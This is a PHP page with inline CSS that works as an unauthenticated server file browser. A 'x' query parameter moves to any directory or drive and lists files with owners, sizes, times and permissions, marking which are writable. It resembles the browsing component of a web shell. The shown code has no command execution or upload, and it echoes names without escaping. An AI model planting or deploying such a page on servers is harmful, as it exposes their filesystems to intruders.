<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
	body {
		margin-left:200px;
		margin-right:200px;
		overflow: hidden;
	}
	* {
		font-family: 'Roboto', sans-serif;
	}
	.files {
		overflow: auto;
		border-radius:20px;
		background: #fff;
		padding:15px;
		height:auto;
		border:1px solid #e0e0e0;
		max-height:79%;
	}
	.block {
        clear: both;
    }
    .block:first-child {
        border: none;
    }
    .block .img img {
        width: 40px;
        height: 40px;
        display: block;
        float: left;
        margin-right: 10px;
    }
    .block .name {
        display: inline-block;
    }
    .block .date {
        margin-top: 4px;
        font-size: 70%;
        color: #666;
    }
    .block .date .dir-size,
    .block .date .file-size {
        margin-right:10px;
        display: inline-block;
    }
    .block .date .dir-perms,
    .block .date .file-perms {
        margin-right:10px;
        display: inline-block;
    }
    .block .date .dir-time,
    .block .date .file-time {
        margin-right:10px;
        display: inline-block;
    }
    .block .date .dir-owner,
    .block .date .file-owner {
        margin-right:10px;
        display: inline-block;
    }

    .block a {
        border-radius:25px;
        display: block;
        color: #292929;
        padding-top: 8px;
        padding-bottom: 13px;
        padding-left:5px;
        transition: all 0.35s;
    }
    .block a:hover {
        text-decoration: none;
    }
    .cwd {
    	overflow:hidden;
    	border:1px solid #e0e0e0;
    	padding:20px;
    	border-radius:20px;
    	margin-bottom:10px;
    }
    a.pwd {
    	transition: all 0.35s;
    	padding:7px;
    	margin-right: 5px;
    	padding-left:10px;
    	padding-right:10px;
    	border-radius:15px;
    	color: #000;
    	text-decoration: none;
    }
    a.pwd:hover {
    	background: #e3e3e3;
    }
    .disk {
    	
    }
    .disk,
    .pwdd {
    	padding-bottom:10px;
    	padding-top:10px;
    }
    .usb,
    .diskk {
    	width:3%;
    	padding:5px;
    	display: inline-block;
    	
    	margin-right:5px;
    }
    .usb .img,
    .diskk .img {
    	text-align: center;
    	width:20px;
    	height:20px;
    	display: inline-block;
    }
    .usb .img img,
    .diskk .img img {
    	width:15px;
    	margin:2.5px;
    	height:15px;
    }
    .usb .letter,
    .diskk .letter {
    	margin:2px;
    	position: absolute;
    	display: inline-block;
    }
    table.disk {
    	border-collapse: collapse;
    	border-spacing:0;
    }
    table.disk td:first-child {
    	width:130px;
    }
    table.disk td:nth-child(2) {
    	width:10px;
    	text-align: center;
    }
    table.disk td:nth-child(3) {
    }
    .pwdd table {
    	border-collapse: collapse;
    	border-spacing:0;
    	width:100%;
    }
    .pwdd table td:first-child {
    	width:130px;
    }
    .pwdd table td:nth-child(2) {
    	width:10px;
    	text-align: center;
    }
    .pwdd table td:last-child {
    }
</style>
<?php
date_default_timezone_set("Asia/Jakarta");
if (isset($_GET['x'])) {
	cd($_GET['x']);
}
function files($getcwd, $type) {
	$array = array();
	foreach (scandir($getcwd) as $key => $value) {
		$filename['fullname'] = $getcwd . DIRECTORY_SEPARATOR . $value;
		switch ($type) {
			case 'dir':
				if (!is_dir($filename['fullname']) || $value === '.' || $value === '..') {
					continue 2;
				}
				break;
			case 'file':
				if (!is_file($filename['fullname'])) {
					continue 2;
				}
				break;
		}
		$filename['name']  = basename($filename['fullname']);
		$filename['ftime'] = ftime($filename['fullname']);
		$filename['owner'] = owner($filename['fullname']);
		$filename['size']  = is_dir($filename['fullname']) ? countDir($filename['fullname']) . " items" : size($filename['fullname']);

		$array[] = $filename; 
	} return $array;
}
function perms($filename) {
	$perms = @fileperms($filename);
        switch ($perms & 0xf000) {
            case 0xc000:
                $info = 's';
                break;
            case 0xa000:
                $info = 'l';
                break;
            case 0x8000:
                $info = 'r';
                break;
            case 0x6000:
                $info = 'b';
                break;
            case 0x4000:
                $info = 'd';
                break;
            case 0x2000:
                $info = 'c';
                break;
            case 0x1000:
                $info = 'p';
                break;
            default:
                $info = 'u';
        }
        $info .= $perms & 0x0100 ? 'r' : '-';
        $info .= $perms & 0x0080 ? 'w' : '-';
        $info .= $perms & 0x0040 ? 
        		($perms & 0x0800 ? 's': 'x'):
        		($perms & 0x0800 ? 'S' : '-');
        $info .= $perms & 0x0020 ? 'r' : '-';
        $info .= $perms & 0x0010 ? 'w' : '-';
        $info .= $perms & 0x0008 ?
        		($perms & 0x0400 ? 's' : 'x'):
        		($perms & 0x0400 ? 'S' : '-');
        $info .= $perms & 0x0004 ? 'r' : '-';
        $info .= $perms & 0x0002 ? 'w' : '-';
        $info .= $perms & 0x0001 ?
        		($perms & 0x0200 ? 't' : 'x'):
        		($perms & 0x0200 ? 'T' : '-');
        return $info;
}
function getext($filename)
    {
        return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    }
function geticon($filename)
    {
        switch (getext($filename)) {
            case 'php1':
            case 'php2':
            case 'php3':
            case 'php4':
            case 'php5':
            case 'php6':
            case 'phtml':
            case 'php':
                print(
                    'https://image.flaticon.com/icons/svg/337/337947.svg'
                );
                break;
            case 'html':
            case 'htm':
                print(
                    'https://image.flaticon.com/icons/svg/337/337937.svg'
                );
                break;
            case 'css':
                print(
                    'https://image.flaticon.com/icons/svg/136/136527.svg'
                );
                break;
            case 'js':
                print(
                    'https://image.flaticon.com/icons/svg/337/337941.svg'
                );
                break;
            case 'json':
                print(
                    'https://image.flaticon.com/icons/svg/136/136525.svg'
                );
                break;
            case 'xml':
                print(
                    'https://image.flaticon.com/icons/svg/337/337959.svg'
                );
                break;
            case 'py':
                print(
                    'https://image.flaticon.com/icons/svg/617/617531.svg'
                );
                break;
            case 'zip':
                print(
                    'https://image.flaticon.com/icons/svg/2306/2306214.svg'
                );
                break;
            case 'rar':
                print(
                    'https://image.flaticon.com/icons/svg/2306/2306170.svg'
                );
                break;
            case 'htaccess':
                print(
                    'https://image.flaticon.com/icons/png/128/1720/1720444.png'
                );
                break;
            case 'txt':
                print(
                    'https://image.flaticon.com/icons/svg/136/136538.svg'
                );
                break;
            case 'ini':
                print(
                    'https://image.flaticon.com/icons/svg/1126/1126890.svg'
                );
                break;
            case 'mp3':
                print(
                    'https://image.flaticon.com/icons/svg/337/337944.svg'
                );
                break;
            case 'mp4':
                print(
                    'https://image.flaticon.com/icons/svg/2306/2306142.svg'
                );
                break;
            case 'log':
            case 'log1':
            case 'log2':
                print(
                    'https://image.flaticon.com/icons/svg/2306/2306124.svg'
                );
                break;
            case 'dat':
                print(
                    'https://image.flaticon.com/icons/svg/2306/2306050.svg'
                );
                break;
            case 'exe':
                print(
                    'https://image.flaticon.com/icons/svg/136/136531.svg'
                );
                break;
            case 'apk':
                print(
                    'https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg'
                );
                break;
            case 'yaml':
                print(
                    'https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png'
                );
                break;
            case 'bak':
                print(
                    'https://image.flaticon.com/icons/svg/2125/2125736.svg'
                );
                break;
            case 'ico':
                print(
                    'https://image.flaticon.com/icons/svg/1126/1126873.svg'
                );
                break;
            case 'png':
                print(
                    'https://image.flaticon.com/icons/svg/337/337948.svg'
                );
                break;
            case 'jpg':
            case 'jpeg':
            case 'webp':
                print(
                    'https://image.flaticon.com/icons/svg/337/337940.svg'
                );
                break;
            case 'svg':
                print(
                    'https://image.flaticon.com/icons/svg/337/337954.svg'
                );
                break;
            case 'gif':
                print(
                    'https://image.flaticon.com/icons/svg/337/337936.svg'
                );
                break;
            case 'pdf':
                print(
                    'https://image.flaticon.com/icons/svg/337/337946.svg'
                );
                break;
            default:
                print(
                    'https://image.flaticon.com/icons/svg/833/833524.svg'
                );break;
        }
    }
function wr($filename, $perms, $type)
    {
        if (is_writable($filename)) {
            switch ($type) {
                case 1:
                    print "<font color='#000'>{$perms}</font>";
                    break;
                case 2:
                    print "<font color='green'>{$perms}</font>";
                    break;
            }
        } else {
            print "<font color='red'>{$perms}</font>";
        }
    }
function pwd() {
	$path = getcwd();
	$path = str_replace('\\', '/', $path);
	$paths = explode('/', $path);
	$result = '';
	foreach ($paths as $id => $value) {
		if ($value == '' && $id == 0) {
			$result .= "<a href='?x=/'>/</a>";
			continue;
		} if ($value == '') {
			continue;
		}
		$result .= "<a class='pwd' href='?x=";
		$linkpath = '';
		for ($i=0; $i <= $id ; $i++) { 
			$linkpath .= $paths[$i];
			if ($i != $id) $linkpath .= "/";
		}
		$result .= $linkpath;
		$result .= "'>{$value}</a>";
	} return $result;
}
function disk() {
	$letters = "";
	$v = explode("\\", getcwd());
	$v = $v[0];
	 foreach(range("A", "Z") as $letter) {
	  	$bool = $isdiskette = in_array($letter, array("A"));
	  	if(!$bool) $bool = is_dir("{$letter}:\\");
	  	if($bool) {
	   		$letters .= "<a href='?x={$letter}:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
	   		if($letter.":" != $v) {
	   			$letters .= "<div class='diskk'>
	   						 <div class='img'>
	   						 <img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828703.svg'>
	   						 </div>
	   						 <div class='letter'>{$letter}</div> 
	   						 </div>";
	   		}
	   		else {
	   			$letters .= "<div class='usb'>
	   						 <div class='img'>
	   						 <img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828650.svg'>
	   						 </div>
	   						 <div class='letter'>{$letter}</div> 
	   						</div>";
	   		}
	   		$letters .= "</a>";
	  	}
	}
	if(!empty($letters)) { ?>
		<table class="disk" width="100%">
			<tr>
				<td>
					Detected Drives
				</td>
				<td>:</td>
				<td>
					<?= $letters ?>
				</td>
			</tr>
		</table>
	<?php }
	if(@count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
	  		$v = realpath(getcwd(). "..");
	  		if(empty($v)) {
	  			$a = explode(DIRECTORY_SEPARATOR,path());
	  			unset($a[count($a)-2]);
	  			$v = join(DIRECTORY_SEPARATOR, $a);
	  		}
	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
		}
	}
}
function cd($directory) {
	@chdir($directory);
	if (!@chdir($directory)) {
		echo "not anything";
	}
}
function countDir($filename){
	return @count(scandir($filename)) - 2;
}
function size($filename) {
	if (is_file($filename)) {
		$filepath = $filename;
		if (!realpath($filepath)) {
			$filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
		}
		$filesize = filesize($filepath);
		$array = ["TB", "GB", "MB", "KB", "Byte"];
		$total = count($array);
		while ($total-- && $filesize > 1024) {
			$filesize /= 1024;
		}
		return round($filesize, 2) . " " . $array[$total];
	}
}
function ftime($filename) {
	return date('d M Y - H:i A', @filemtime($filename));
}
function owner($filename)
    {
        if (function_exists("posix_getpwuid")) {
            $owner = @posix_getpwuid(fileowner($filename));
            $owner = $owner['name'];
        } else {
            $owner = fileowner($filename);
        }
        if (function_exists("posix_getgrgid")) {
            $group = @posix_getgrgid(filegroup($filename));
            $group = $group['name'];
        } else {
            $group = filegroup($filename);
        }
        return $owner ."<span class='group'>/".$group ."</span>";
    }
?>
<div class="cwd">
	<div class="disk">
		<span><?= disk() ?></span>
	</div>
	<div class="pwdd">
		<table>
			<tr>
				<td>
					Current Dir
				</td>
				<td>:</td>
				<td>
					<?= pwd() ?>
				</td>
			</tr>
		</table>
	</div>
</div>
<div class="files">
	<?php
	foreach (files(getcwd(), "dir") as $key => $dir) { ?>
		<div class="block">
			<a href="?x=<?= $dir['fullname'] ?>" title="<?= $dir['name'] ?>">
				<div class="img">
					<img src="https://image.flaticon.com/icons/svg/715/715676.svg">
				</div>
				<div class="name">
					<?= $dir['name'] ?>
					<div class="date">
						<div class="dir-size">
							<?= $dir['size'] ?>
						</div>
						<div class="dir-perms">
							<?= wr($dir['fullname'],perms($dir['fullname']), 2) ?>
						</div>
						<div class="dir-time">
							<?= $dir['ftime'] ?>
						</div>
						<div class="dir-owner">
							<?= $dir['owner'] ?>
						</div>
					</div>
				</div>
			</a>
		</div>
	<?php }
	foreach (files(getcwd(), "file") as $key => $file) { ?>
		<div class="block">
			<a href="#<?= $file['name'] ?>" title="<?= $file['name'] ?>">
				<div class="img">
					<img src="<?= geticon($file['fullname']) ?>">
				</div>
				<div class="name">
					<?= $file['name'] ?>
					<div class="date">
						<div class="file-size">
							<?= $file['size'] ?>
						</div>
						<div class="file-perms">
							<?= wr($file['fullname'],perms($file['fullname']), 2) ?>
						</div>
						<div class="file-time">
							<?= $file['ftime'] ?>
						</div>
						<div class="file-owner">
							<?= $file['owner'] ?>
						</div>
					</div>
				</div>
			</a>
		</div>
	<?php }
?>
</div>
